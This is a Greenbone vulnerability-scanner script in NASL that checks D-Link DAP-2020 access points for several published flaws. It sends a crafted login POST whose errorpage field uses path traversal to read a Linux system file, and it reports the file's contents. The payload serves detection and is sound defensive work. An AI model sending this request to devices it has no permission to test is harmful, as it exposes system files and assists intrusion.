# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE_PREFIX = "cpe:/o:dlink";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145483");
  script_version("2023-11-21T05:05:52+0000");
  script_tag(name:"last_modification", value:"2023-11-21 05:05:52 +0000 (Tue, 21 Nov 2023)");
  script_tag(name:"creation_date", value:"2021-03-02 08:17:18 +0000 (Tue, 02 Mar 2021)");
  script_tag(name:"cvss_base", value:"8.3");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-04-22 20:30:00 +0000 (Thu, 22 Apr 2021)");

  script_cve_id("CVE-2021-27248", "CVE-2021-27249", "CVE-2021-27250");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DAP-2020 <= 1.01 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dns_http_detect.nasl", "gb_dlink_dsl_detect.nasl",
                      "gb_dlink_dap_consolidation.nasl", "gb_dlink_dir_consolidation.nasl",
                      "gb_dlink_dwr_detect.nasl");
  script_mandatory_keys("d-link/http/detected"); # nb: Experiences in the past have shown that various different devices might be affected
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"D-Link DAP-2020 devices are prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Webproc getpage stack-based buffer overflow RCE (CVE-2021-27248)

  - WEB_CmdFileList command injection RCE (CVE-2021-27249)

  - Errorpage external control of file name information disclosure (CVE-2021-27250)

  - Webupg sessionid handling remote heap-based buffer overflow

  - Insecure sessionid generation remote session hijacking weakness

  - Webproc WEB_GetCgiVars() function multiple parameters remote stack buffer overflows

  - Webproc WEB_DisplayPage() function multiple parameters remote stack buffer overflows

  - Webproc main() function HTTP POST parameter handling remote stack buffer overflow

  - WEB_PostObjAuth() function HTTP POST parameter handling remote heap buffer overflow

  - libssap.so COMM_MakeCustomMsg() function stack buffer overflow");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"D-Link DAP-2020 devices. Other D-Link products might be affected
  as well.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201");
  script_xref(name:"URL", value:"https://suid.ch/research/DAP-2020_Preauth_RCE_Chain.html");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-21-204/");
  script_xref(name:"URL", value:"https://www.zerodayinitiative.com/advisories/ZDI-21-205/");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!dir = get_app_location(cpe: cpe, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/cgi-bin/webproc";

files = traversal_files("linux");

foreach pattern (keys(files)) {

  data = "getpage=html%2Findex.html&errorpage=/" + files[pattern] + "&var%3Amenu=setup&var%3A" +
         "page=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=test&%3A" +
         "action=login&%3Asessionid=365dfaef";

  req = http_post_put_req(port: port, url: url, data: data);
  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(pattern: pattern, string: res)) {
    data = http_extract_body_from_response(data: res);
    report = 'It was possible to read the file /' + files[pattern] + '.\r\n\r\nResponse:\n\n' + data;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
